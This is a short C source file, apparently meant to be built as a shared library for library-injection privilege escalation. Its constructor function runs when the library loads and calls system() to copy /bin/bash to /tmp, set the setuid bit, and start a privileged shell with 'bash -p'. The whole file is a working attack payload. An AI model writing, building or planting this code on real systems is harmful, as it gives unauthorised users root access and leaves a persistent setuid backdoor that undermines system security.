# include <stdio.h>
# include <stdlib.h>

static void inject() __attribute__((constructor));


void inject() {

// Copies /bin/bash to /tmp/bash Then chmod +s /tmp/bash and run this.
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");

}
